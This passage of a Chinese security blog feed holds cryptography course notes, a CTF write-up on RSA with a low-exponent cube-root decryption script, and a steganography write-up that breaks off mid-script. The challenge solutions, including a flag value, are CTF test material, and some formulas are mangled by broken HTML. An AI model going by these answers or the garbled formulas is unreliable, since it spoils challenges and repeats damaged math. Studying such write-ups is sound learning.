id="第五章"><a href="#第五章" class="headerlink" title="第五章"></a>第五章</h2><h3 id="序列密码分类"><a href="#序列密码分类" class="headerlink" title="序列密码分类"></a>序列密码分类</h3><p>在序列密码中，根据状态函数是否独立于明文或密文，可以将序列密码分为同步序列密码和自同步序列密码两类。</p><h4 id="同步序列密码"><a href="#同步序列密码" class="headerlink" title="同步序列密码"></a>同步序列密码</h4><p>密钥流独立于消息流产生 。加密端密钥流发生器一位接一位地产生密钥，在解密端发生器产生出完全相同的密钥。<br>同步密钥流生成器模型特点：<br>（1）<strong>同步</strong>：在一个同步序列中，发送方和接收方必须是同步的，即用同样的密钥且该密钥操作在同样的位置（状态），才能保证正确的解密。<br>（2）<strong>无错误传播</strong>：在传输期间，一个密文字（或位）被改变（不是删除和插入）只能影响该密文字（或位）的恢复，不会对后续密文字（或位）产生影响。<br>（3）<strong>主动攻击破坏同步</strong>：按照同步要求，一个主动攻击对密文进行插入、删除或重放操作都会立即破坏其同步，从而可能被解密器检测出来。作为无错误传播的结果，主动攻击者可能有选择地对密文进行改动，并准确地知道这些改动对明文的影响，这时可以采用为数据源提供认证并保证数据完整性的技术。</p><h4 id="自同步序列密码"><a href="#自同步序列密码" class="headerlink" title="自同步序列密码"></a>自同步序列密码</h4><p>也称为异步流密码，密钥流的产生<strong>不是独立于</strong>明文流和密文流的。<br><img src="/2018/09/06/密码学/1526918362792.png" alt="Alt text"><br>自同步密钥流生成器模型特点：<br>（1）<strong>自同步</strong>：自同步的实现依赖于密文字被删除或插入，这是因为解密只取决于先前固定数量的密文字。自同步序列密码在同步丢失后能够自动重新建立同步，并正确地解密，只有固定数量的明文字不能解密。<br>（2）<strong>有限的错误传播</strong>：因为自同步序列的状态取决于t个已有的密文字符，若一个密文字（或位）在传输过程中被修改（插入或删除），则解密时最多只影响到后续 t个密文字的解密，即只发生有限的错误传播。<br>（3）<strong>难检测主动攻击</strong>：相比于同步，自同步使得主动攻击者发起的对密文字的插入、删除、重放等攻击只会产生非常有限的影响，正确的解密能很快自动重建。因此，主动攻击对自同步序列密码很困难的，可能需要采用为数据源提供认证并保证数据完整性的技术。有限的错误传播特性使得主动攻击者对密文字的任何改动都会引起一些密文字解密出错。<br>（4）<strong>密文统计扩散</strong>：每个明文字都会影响其后的整个密文，即密文的统计特性被扩散到密文中。所以，自同步序列密码体制在抵抗利用明文冗余度而发起的攻击方面要强于同步序列密码。</p><h3 id="LFSR线性反馈移位寄存器"><a href="#LFSR线性反馈移位寄存器" class="headerlink" title="LFSR线性反馈移位寄存器"></a>LFSR线性反馈移位寄存器</h3><p>移位寄存器是流密码产生密钥流的一个主要组成部分。GF(2)上一个n级反馈移位寄存器由n个二元存储器与一个反馈函数$f(a_1,a_2,…,a_n)$组成<br><img src="/2018/09/06/密码学/1526918733978.png" alt="Alt text"></p><p>1.n级线性反馈移位寄存器的<strong>状态周期小于等于2n-1</strong>。<br>2.周期达到最大值$2^n-1$时，称&#123;a<sub>i</sub>&#125;为n级m序列。<br>3.n级LFSR产生的序列有最大周期$2^n-1$的必要条件是其特征多项式为不可约多项式。<br>4.若n次不可约多项式p(x)的阶$2^n-1$，则称其为n次本原多项式。<br>5.设p(x)是GF(2)上的多项式，使p(x)|(x<sup>p</sup>-1)的最小的p称为p(x)的周期或阶</p><h2 id="第六章"><a href="#第六章" class="headerlink" title="第六章"></a>第六章</h2><h3 id="非对称密码概述"><a href="#非对称密码概述" class="headerlink" title="非对称密码概述"></a>非对称密码概述</h3><p><strong>分组密码和序列密码都属于对称密码体制</strong></p><p><img src="/2018/09/06/密码学/1526921469503.png" alt="Alt text"></p><p>（1）主体A若需要其他主体利用非对称密码体制向他发送秘密消息，先要生成<strong>一对密钥</strong>，其中一个用于加密，另一个用于解密。用于<strong>加密的密钥</strong>在非对称密码体制中称为公开密钥，也称公开钥或公钥，是<strong>不需要保密</strong>的。A的公开密钥通常表示为PKA(public key of A)。用于解密的密钥称为秘密密钥，简称秘密钥或私钥，需要解密方<strong>严格保密</strong>。B的秘密密钥通常表示为SKA(secret key of A)。<br>（2）B若要向A发送秘密消息m(message)，先要获取A的<strong>加密密钥</strong>，也即<strong>公钥</strong>。计算c=𝐸<sub>𝑃𝐾<sub>𝐴 </sub></sub> (𝑚) ，得到消息m对应的密文c(cipher)，然后把c发送给A。其中c 表示加密消息得到的密文，E(Encrypt)表示对消息进行加密的算法。𝐸<sub>𝑃𝐾<sub>𝐴</sub></sub>  (𝑚)表示用加密算法E和公开密钥PK<sub>A</sub>对消息m进行加密。<br>（3）A在接收到密文c后，计算𝑚=𝐷<sub>𝑆𝐾<sub>𝐴</sub></sub> (𝑐)  , 得到密文c对应的消息m。其中D(Decrypt)表示对密文进行<strong>解密</strong>的算法，𝐷<sub>𝑆𝐾<sub>𝐴</sub></sub> (𝑐)表示用解密算法D和秘密密钥SK<sub>A</sub>对密文c进行解密。</p><p>由于<strong>只有接收者A有解密密钥</strong>，故密文c在公共信道的传输过程中是安全的。</p><h3 id="RSA密码算法"><a href="#RSA密码算法" class="headerlink" title="RSA密码算法"></a>RSA密码算法</h3><h4 id="密钥的产生"><a href="#密钥的产生" class="headerlink" title="密钥的产生"></a>密钥的产生</h4><p>① 选择两个满足需要的大素数p和q，计算<strong>n=p×q,φ(n)= (p-1)×(q-1)</strong>，其中φ(n)是n的欧拉函数值。<br>② 选一个整数e,满足1&lt;e&lt;φ(n)，且gcd(φ(n),e)=1。通过<strong>d×e≡1modφ(n)</strong>，计算出d。<br>③ 以&#123;e,n&#125;为公开密钥，&#123;d,n&#125;为秘密密钥。<br>假设Alice是秘密消息的接收方，则只有Alice知道秘密密钥&#123;d,n&#125;，所有人都可以知道公开密钥&#123;e,n&#125;。</p><h4 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h4><p>如果想发送消息m给Alice，就选择Alice的公钥&#123;e,n&#125;，然后计算：$c≡m^e mod n$，然后把c发送给Alice。</p><h4 id="解密-1"><a href="#解密-1" class="headerlink" title="解密"></a>解密</h4><p>接收方Alice收到c，用私钥计算：$m≡c^dmodn$</p><p><img src="/2018/09/06/密码学/1526955463464.png" alt="Alt text"></p><ul><li><strong>能够抵御选择明文攻击</strong></li><li><strong>RSA的安全性基于分解大整数难题</strong></li></ul><p>（1）不同的用户不能用相同的模数n. 大素数的个数是十分庞大的资源，不用担心会被用完。<br>（2）p与q的差值要大<br>（3）p-1和q-1都应有大的素因子。<br>（4）私钥d的选择。如果私钥d的值比较小，由RSA的解密算法可知，对数据进行解密的速度越快。但是，私钥d的值不能太小，一般要求d≥n1/4。<br>（5）更换密钥<br>如果私钥d被泄露，则在模n的情况下重新计算一对密钥是不够的，而是必须选择一个新的公钥n.<br>（6）e不可太小，否则不安全。                              </p><h2 id="第七章"><a href="#第七章" class="headerlink" title="第七章"></a>第七章</h2><h3 id="Hash函数"><a href="#Hash函数" class="headerlink" title="Hash函数"></a>Hash函数</h3><p>Hash函数H是一公开函数，不需要密钥，用于将任意长的消息m映射为较短的、固定长度的一个值𝐻(𝑚)<br><img src="/2018/09/06/密码学/1526957776564.png" alt="Alt text"><br>要求：1.接收任意长度的消息输入 2.生成较短的固定长度输出 3.容易快速的计算出哈希值<br>安全性：<br>（1）<strong>单向性</strong>：由消息的哈希值倒推出消息在计算上不可行，即给定𝐻(𝑚)，计算m计算上不可行；<br>（2）<strong>抗弱碰撞性</strong>：对于任何给定消息及其哈希值，不可能找到另一个能映射出该哈希值的消息，即给定的𝐻(𝑚)，很难找到一个$𝑚≠𝑚^′$使得$𝐻(𝑚)=𝐻(𝑚^′)$；<br>（3）<strong>抗强碰撞性</strong>: 对于任何两个不同的消息，它们的哈希值必定不同，很难找到两条消息m和$𝑚^′$，使得$𝐻(𝑚)=𝐻(𝑚^′)$。</p><h3 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h3><p>消息摘要长度为128bits</p><h3 id="SHA-1"><a href="#SHA-1" class="headerlink" title="SHA-1"></a>SHA-1</h3><p>SHA-1接受输入消息的最大长度为2<sup>64</sup>-1 bits，生成160 bits的消息摘要。<br><img src="/2018/09/06/密码学/1526960251320.png" alt="Alt text"><br>包含四轮运算，每一轮20回合，总共80回合</p><p>（1）填充消息<br>输入消息M，首先应该填充消息，保证输入SHA-1计算的整个消息长度是<strong>512 bits的倍数</strong>。<br>第一个比特位填‘1’，其余全部填‘0’</p><p>假设消息M的长度为 𝑙 bits，在原始消息M尾部增加1个比特位”1”和𝑘个”0” 比特位，𝑙和𝑘满足<br>𝒍+𝟏+𝒌≡𝟒𝟒𝟖(𝐦𝐨𝐝 𝟓𝟏𝟐)，<br>并且k为最小的非负整数。然后再在填充消息的末尾添加64-bit的块，该64-bit块是原始消息比特位长度变换为二进制块，如果消息长度变换为二进制块的位的个数小于64，则在左边补0，使得块的长度刚好等于64 bits。</p><p><strong>最后16bits为消息长度值</strong> 看例题</p><p>（2）被填充消息分组<br>把填充后的整个消息按照<strong>512-bit</strong>块进行划分，假若划分为N个512-bit块，依次为：𝑀<sup>(0)</sup>,𝑀<sup>(1)</sup>,⋯,𝑀<sup>(N-1)</sup>。</p><p>每个512-bit块又由<strong>16个32-bit</strong>字组成，第i个512-bit块的第一个32-bit 字，记为𝑀<sub>0</sub><sup>(𝑖)</sup>，第二个32-bit字，记为𝑀<sub>1</sub><sup>(𝑖)</sup>，16个32-bit字依次𝑀<sub>0</sub><sup>(𝑖)</sup>𝑀<sub>1</sub><sup>(𝑖)</sup>,⋯,𝑀<sub>15</sub><sup>(𝑖)</sup>。</p><p>（3）数据扩展<br><img src="/2018/09/06/密码学/1526960939921.png" alt="Alt text"><br><img src="/2018/09/06/密码学/1526960958946.png" alt="Alt text"></p><p>（4）初始化变量<br>SHA-1的初值变量IV为160 bits的数据块，即5个32-bit的字，依次为𝐻<sub>0</sub><sup>(0)</sup>, 𝐻<sub>1</sub><sup>(0)</sup>,𝐻<sub>2</sub><sup>(0)</sup>),𝐻<sub>3</sub><sup>(0)</sup>, 𝐻<sub>4</sub><sup>(0)</sup>,初值变量设置为：<br><img src="/2018/09/06/密码学/1526961195291.png" alt="Alt text"></p><h3 id="基于分组的CBC-MAC"><a href="#基于分组的CBC-MAC" class="headerlink" title="基于分组的CBC-MAC"></a>基于分组的CBC-MAC</h3><p>大多数消息认证码都是基于分组密码，它们有相对较短比特长度或短密码（如基于DES-CBC的MAC是56 bits），MAC函数与加密算法类似，不同之处为<strong>MAC函数不必是可逆的</strong>，因此与加密算法相比更不易被攻破，提供足够安全。<br><strong>CBC-MAC</strong>算法是<strong>最常用</strong>的一种基于分组的MAC算法<img src="/2018/09/06/密码学/1526974114969.png" alt="Alt text"><br>其初始变量 取值为零，然后把需要认证的数据 进行分组，分组的长度由所选的分组密码算法所决定，若最后一组数据不够分组规定长度，则需要进行必要的填充，最简单填充方法在其后补零.</p><h3 id="消息认证"><a href="#消息认证" class="headerlink" title="消息认证"></a>消息认证</h3><p>基于消息认证码的认证过程，前提条件是通信双方共享一密钥K。<br><img src="/2018/09/06/密码学/1526974282002.png" alt="Alt text"><br>存在的问题：掌握密钥的人否认</p><h2 id="第八章"><a href="#第八章" class="headerlink" title="第八章"></a>第八章</h2><h3 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h3><p>数字签名是在密码学理论的基础上发展起来的，基于公钥密码体制和私钥密码体制都可以获得数字签名，每种签名方案都与某一种或多种密码体制紧密联系在一起。目前<strong>主要集中在基于公钥密码体制</strong>的数字签名技术的研究。<strong>多以非对称密码体制</strong>为基础提出数字签名方案。</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>RSA算法中，一个私钥&#123;d, n&#125;只有唯一的&#123;e, n&#125;与之对应。&#123;e, n&#125;表示了秘密密钥&#123;d, n&#125;的持有者的身份。<br>让消息发布者Bob先计算s≡m<sup>d</sup> mod n，然后把s附于消息m之后即&#123;m, s&#125;一起放到公共媒介上。<br>可以通过计算m≡s<sup>e</sup> mod n成立与否，来判定消息是不是Bob发布的消息，以及消息是否被篡改。</p><h4 id="分类-1"><a href="#分类-1" class="headerlink" title="分类"></a>分类</h4><p>按数字签名的所依赖的理论基础分，主要可以分为：<br>（1）基于<strong>大数分解难题</strong>的数字签名，如8.3.1节<strong>RSA</strong>数字签名方案；<br>（2）基于<strong>离散对数难题</strong>的数字签名，如8.3.2节介绍的<strong>ElGamal</strong>数字签名方案，8.4.1和8.4.3节介绍的美国的数字签名方案；<br>（3）基于<strong>椭圆曲线离散对数</strong>的数字签名，这类签名往往由基于离散对数的数字签名改进而来,如8.4.2节、8.4.4节和8.4.5节介绍的数字签名方案。<br>数字签名的用途分，可以把数字签名分为普通的数字签名和特殊用途的数字签名。</p><h3 id="RSA数字签名算法"><a href="#RSA数字签名算法" class="headerlink" title="RSA数字签名算法"></a>RSA数字签名算法</h3><p>（1）参数产生<br>①选择两个满足需要的大素数p和q，计算n=p×q, φ(n)= (p-1)×(q-1)，其中φ(n)是n的欧拉函数值。<br>②选一个整数e, 满足1<e<φ(n)，且gcd(φ(n),e)=1。通过d×e≡1modφ(n)，计算出d。 ③以&#123;e,n&#125;为公开密钥，&#123;d,n&#125;为秘密密钥。="" （2）签名过程="" 假设签名者为bob，则只有bob知道秘密密钥&#123;d,="" n&#125;。="" 设需要签名的消息为m，则签名者bob通过如下计算对m签名：s≡md="" mod="" n="" （m,="" s）为对消息m的签名。bob在公共媒体上宣称他发布了消息m，同时把对m的签名s置于消息后用于公众验证签名。="" （3）验证过程。="" 公众在看到消息m和对其签名s后，利用bob的公开验证密钥&#123;e,="" n&#125;对消息进行验证。公众计算：m≡s<sup="">e mod n是否成立，若成立，则Bob的签名有效。公众认为消息m的确是Bob所发布，且消息内容没有被篡改。也就是说，公众可以容易鉴别发布人发布的消息的完整性。</e<φ(n)，且gcd(φ(n),e)=1。通过d×e≡1modφ(n)，计算出d。></p><ul><li><strong>RSA加密算法:公钥加密，私钥解密</strong></li><li><strong>RSA签名算法:私钥签名，公钥验证</strong><h3 id="改进算法"><a href="#改进算法" class="headerlink" title="改进算法"></a>改进算法</h3><strong>公开的安全哈希函数为H(·)</strong>，签名算法的参数选择如前所述，改进后签名方案的签名过程和验证过程如下：<br>（1）签名过程<br>设需要签名的消息为m，签名者Bob通过如下计算完成签名：s≡H(m)<sup>d</sup> mod n<br>（m, s）为对消息m的签名。</li></ul><p>（2）验证过程<br>在收到消息m和签名s后，验证H(m)≡s<sup>e</sup> mod n 是否成立。若成立，则签名有效。</p><p>通过使用哈希函数，有效防止了对签名的伪造，增强了签名算法的安全性，这也是在很多签名算法中使用哈希函数的原因之一。</p><h2 id="第九章"><a href="#第九章" class="headerlink" title="第九章"></a>第九章</h2><h3 id="认证协议"><a href="#认证协议" class="headerlink" title="认证协议"></a>认证协议</h3><p>所谓协议（Protocol），就是两个或两个以上的参与者为完成某项特定的任务而采取的一系列步骤，这个定义包含3层含义：<br>第一，协议自始自终是有序的过程，每一步必须依次执行，在前一步没有完成之前，后面的步骤不可能被执行；<br>第二，协议至少需要两个参与者，一个人可以通过执行一系列的步骤来完成某项任务，但它构不成协议；<br>第三，通过执行协议必须能够完成某项任务，即使某些东西看似协议，但没有完成任何任务，也不能成为协议，只不过是浪费时间的空操作。</p><h4 id="单向认证"><a href="#单向认证" class="headerlink" title="单向认证"></a>单向认证</h4><h5 id="需要第三方参与的单向认证"><a href="#需要第三方参与的单向认证" class="headerlink" title="需要第三方参与的单向认证"></a>需要第三方参与的单向认证</h5><p><img src="/2018/09/06/密码学/1526959048344.png" alt="Alt text"></p><p>采用对称密码技术，第三方通常为KDC密钥分发中心，AS认证服务器</p><h5 id="无需第三方参与的单向认证"><a href="#无需第三方参与的单向认证" class="headerlink" title="无需第三方参与的单向认证"></a>无需第三方参与的单向认证</h5><p><img src="/2018/09/06/密码学/1526959151737.png" alt="Alt text"></p><h4 id="双向认证"><a href="#双向认证" class="headerlink" title="双向认证"></a>双向认证</h4><p>在双向认证过程中，通信双方需要互相认证各自的身份，然后交换会话密钥<br><img src="/2018/09/06/密码学/1526959220694.png" alt="Alt text"></p><h2 id="第十章"><a href="#第十章" class="headerlink" title="第十章"></a>第十章</h2><h3 id="密钥组织结构"><a href="#密钥组织结构" class="headerlink" title="密钥组织结构"></a>密钥组织结构</h3><p><img src="/2018/09/06/密码学/1526970146207.png" alt="Alt text"><br><strong>使用n级密钥K<sub>n</sub>通过算法 f<sub>n</sub>保护明文数据</strong><br><strong>主密钥</strong>K<sub>1</sub>是整个密钥管理系统的核心<br>最下层K<sub>n</sub>叫<strong>工作密钥</strong></p><h3 id="密钥分类"><a href="#密钥分类" class="headerlink" title="密钥分类"></a>密钥分类</h3><ul><li>基本密钥（初始密钥或用户密钥）：可以在保留较长时间</li><li>会话秘钥（数据加密密钥）：又叫工作密钥，一般是动态的，使用完后立即清除，一次一密</li><li>密钥加密密钥：二级密钥</li><li>主密钥 </li></ul><h3 id="DH密钥交换协议"><a href="#DH密钥交换协议" class="headerlink" title="DH密钥交换协议"></a>DH密钥交换协议</h3><p>Diffie-Hellman算法的<strong>惟一目的</strong>就是使两个用户能安全地交换密钥，从而得到一个共享的会话密钥（秘密密钥）。需要注意的是<strong>该算法本身不能用于加、解密</strong>。</p><p><strong>算法的安全性是基于Zp上的离散对数问题。</strong></p><h4 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h4><p>（1）用户A选取一个大的随机数r<sub>A</sub>(0&lt; r<sub>A</sub> <p-2 )，计算𝑆<sub="">𝐴=𝑎<sup>𝑟<sub>𝐴</sub> </sup> (𝑚𝑜𝑑𝑝) ，并且把 𝑆<sub>𝐴</sub>发送给用户B。<br>（2）用户B选取一个随机数 r<sub>B</sub>(0&lt; r<sub>B </sub><p-2 )="" ，计算𝑆<sub="">B=𝑎<sup>𝑟<sub>B</sub> </sup> (𝑚𝑜𝑑𝑝)  。并且把 𝑆<sub>B</sub>发送给用户A。<br>（3）用户A计算 <strong>K=S<sub>B</sub><sup>r<sub>A</sub></sup> (𝑚𝑜𝑑𝑝)</strong>，用户B计算<strong>K’=S<sub>A</sub><sup>r<sub>B</sub></sup> (𝑚𝑜𝑑𝑝)</strong><br><strong>K=a<sup>r<sub>A</sub>r<sub>B</sub></sup> (𝑚𝑜𝑑𝑝)</strong> </p-2></p-2></p><p><strong>计算时使用欧拉定理和模重复平方剩余定理简化计算</strong></p><h4 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h4><p><img src="/2018/09/06/密码学/1526975077622.png" alt="Alt text"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;密码学&quot;&gt;&lt;a href=&quot;#密码学&quot; class=&quot;headerlink&quot; title=&quot;密码学&quot;&gt;&lt;/a&gt;密码学&lt;/h1&gt;&lt;h2 id=&quot;第一章&quot;&gt;&lt;a href=&quot;#第一章&quot; class=&quot;headerlink&quot; title=&quot;第一章&quot;&gt;&lt;/a&gt;第一章&lt;/h
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="https://www.twosmi1e.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Crypto中RSA题目总结</title>
    <link href="https://www.twosmi1e.com/2018/08/18/Crypto%E4%B8%ADRSA%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93/"/>
    <id>https://www.twosmi1e.com/2018/08/18/Crypto中RSA题目总结/</id>
    <published>2018-08-18T11:50:19.000Z</published>
    <updated>2018-09-03T11:51:51.210Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-RSA算法简述"><a href="#0x00-RSA算法简述" class="headerlink" title="0x00 RSA算法简述"></a>0x00 RSA算法简述</h3><hr><h4 id="密钥的产生"><a href="#密钥的产生" class="headerlink" title="密钥的产生"></a>密钥的产生</h4><p>① 选择两个满足需要的大素数p和q，计算<strong>n=p×q,φ(n)= (p-1)×(q-1)</strong>，其中φ(n)是n的欧拉函数值。<br>② 选一个整数e,满足1&lt;e&lt;φ(n)，且gcd(φ(n),e)=1。通过<strong>d×e≡1modφ(n)</strong>，计算出d。<br>③ 以{e,n}为公开密钥，{d,n}为秘密密钥。<br>假设Alice是秘密消息的接收方，则只有Alice知道秘密密钥{d,n}，所有人都可以知道公开密钥{e,n}。</p><h4 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h4><p>如果想发送消息m给Alice，就选择Alice的公钥{e,n}，然后计算：$c≡m^e mod n$，然后把c发送给Alice。</p><h4 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h4><p>接收方Alice收到c，用私钥计算：$m≡c^dmodn$</p><p><img src="/2018/08/18/Crypto中RSA题目总结/1526955463464.png" alt="Alt text"></p><ul><li><strong>能够抵御选择明文攻击</strong></li><li><strong>RSA的安全性基于分解大整数难题</strong></li></ul><p>（1）不同的用户不能用相同的模数n. 大素数的个数是十分庞大的资源，不用担心会被用完。<br>（2）p与q的差值要大<br>（3）p-1和q-1都应有大的素因子。<br>（4）私钥d的选择。如果私钥d的值比较小，由RSA的解密算法可知，对数据进行解密的速度越快。但是，私钥d的值不能太小，一般要求d≥n1/4。<br>（5）更换密钥<br>如果私钥d被泄露，则在模n的情况下重新计算一对密钥是不够的，而是必须选择一个新的公钥n.<br>（6）e不可太小，否则不安全。</p><h3 id="0x01-数据处理"><a href="#0x01-数据处理" class="headerlink" title="0x01 数据处理"></a>0x01 数据处理</h3><hr><p>基本上来说，RSA的题目都是围绕着c，m，e，d，n，p，q这几个参数展开的，但是题目一般不会直接给这种样子的参数，而是通过别的方式给出，这里就需要我们使用一些工具或者自己手工将这些参数提取出来。</p><p>pem文件：针对此类文件可以直接使用openssl提取，大概使用过的方式有：</p> <figure class="highlight plain"><figcaption><span>rsautl -encrypt -in FLAG -inkey public.pem -pubin -out flag.enc```</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">```openssl   rsa -pubin -text -modulus -in warmup -in public.pem</div></pre></td></tr></table></figure><p>pcap文件：针对此类文件可以使用wireshark follow一下。这种问题一般都是写了一个交互的crypto系统，所以可能产生多轮交互。</p><p>PPC模式：这种模式是上述pcap文件的交互版，会给一个端口进行一些crypto的交互，参数会在交互中给出。</p><h3 id="0x02-模数分解"><a href="#0x02-模数分解" class="headerlink" title="0x02 模数分解"></a>0x02 模数分解</h3><p>  解决RSA题目最简单，最暴力，最好使的方法就是分解模数n。拿到题目先尝试能否将n分解成功，若成功得到p，q的取值，那么可求n的欧拉函数的值。</p><p>$$ varphi(n)=(p-1)(q-1) $$</p><h3 id="0x03-低加密指数攻击"><a href="#0x03-低加密指数攻击" class="headerlink" title="0x03 低加密指数攻击"></a>0x03 低加密指数攻击</h3><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>e又被称为加密指数，选取小一点的e可以缩短加密时间，但是选取不当的话，就会造成安全问题。</p><p><strong>推荐在e=3时首先尝试此方法</strong></p><p>当e=3时，如果明文过小，导致明文的三次方仍然小于n，那么通过直接对密文三次开方，即可得到明文。</p><p>如果e=3，且$ m^e&lt;{n} $，那么$ c= m^e,$ $e=3$，即：<br>$$ m = sqrt[3]{c} $$<br>如果明文的三次方比n大，但是不是足够大，那么设k，有：</p><p>$$ c= m^e+kn $$</p><p>爆破k，如果$ c-kn $能开三次根式，那么可以直接得到明文。</p><h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><blockquote><p>安恒月赛<br>e = 3<br>n=0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793L<br>c=0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365</p></blockquote><h5 id="解密脚本"><a href="#解密脚本" class="headerlink" title="解密脚本"></a>解密脚本</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> gmpy2 </div><div class="line"></div><div class="line">e = <span class="number">3</span></div><div class="line">n = <span class="number">0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793L</span></div><div class="line">c = <span class="number">0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365</span></div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">'n='</span>, n</div><div class="line"><span class="keyword">print</span> <span class="string">'c='</span>, c</div><div class="line">i = <span class="number">0</span></div><div class="line">result = gmpy2.iroot(c, <span class="number">3</span>)</div><div class="line"><span class="keyword">print</span> result</div><div class="line"><span class="keyword">print</span> (<span class="string">'&#123;:x&#125;'</span>.format(result[<span class="number">0</span>])).decode(<span class="string">'hex'</span>)</div></pre></td></tr></table></figure><p><img src="/2018/08/18/Crypto中RSA题目总结/1533317716345.png" alt="Alt text"></p><p><strong>gmpy2.iroot(m, n)函数</strong>：获取m开n次方的结果，返回一个tuple，第一个数为结果，第二个数为是否为整数的布尔值。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x00-RSA算法简述&quot;&gt;&lt;a href=&quot;#0x00-RSA算法简述&quot; class=&quot;headerlink&quot; title=&quot;0x00 RSA算法简述&quot;&gt;&lt;/a&gt;0x00 RSA算法简述&lt;/h3&gt;&lt;hr&gt;
&lt;h4 id=&quot;密钥的产生&quot;&gt;&lt;a href=&quot;#密钥的
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://www.twosmi1e.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>CTF中遇到的隐写术总结</title>
    <link href="https://www.twosmi1e.com/2018/08/03/CTF%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E9%9A%90%E5%86%99%E6%9C%AF%E6%80%BB%E7%BB%93/"/>
    <id>https://www.twosmi1e.com/2018/08/03/CTF中遇到的隐写术总结/</id>
    <published>2018-08-02T17:05:33.000Z</published>
    <updated>2018-10-11T07:52:33.768Z</updated>
    
    <content type="html"><![CDATA[<h2 id="图片隐写"><a href="#图片隐写" class="headerlink" title="图片隐写"></a>图片隐写</h2><h3 id="F5隐写"><a href="#F5隐写" class="headerlink" title="F5隐写"></a>F5隐写</h3><blockquote><p>安恒杯月赛</p></blockquote><p>题目提示浏览图片的时候能不能F5刷新呢？</p><ol><li>GitHub上的现成工具：git clone <a href="https://github.com/matthewgao/F5-steganography" target="_blank" rel="external">https://github.com/matthewgao/F5-steganography</a></li><li>进入F5_steganography目录 java Extract 图片文件路径 -p password<br><img src="/2018/08/03/CTF中遇到的隐写术总结/1532189155771.png" alt="Alt text"></li></ol><p>然后会出现一个flag.txt但是打开为乱码<br><img src="/2018/08/03/CTF中遇到的隐写术总结/1532189279386.png" alt="Alt text"><br><img src="/2018/08/03/CTF中遇到的隐写术总结/1532189344861.png" alt="Alt text"><br>看文件头是zip 看后缀名解压拿flag<br>flag{96efd0a2037d06f34199e921079778ee}</p><h3 id="xor隐写"><a href="#xor隐写" class="headerlink" title="xor隐写"></a>xor隐写</h3><blockquote><p>巅峰极客 loli</p></blockquote><p>hint:0xFF 想到用0xFF异或整个文件<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># coding=utf-8</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">with</span> open(<span class="string">'./1.png'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f, open(<span class="string">'xor.png'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> wf:</div><div class="line">        <span class="keyword">for</span> each <span class="keyword">in</span> f.read():</div><div 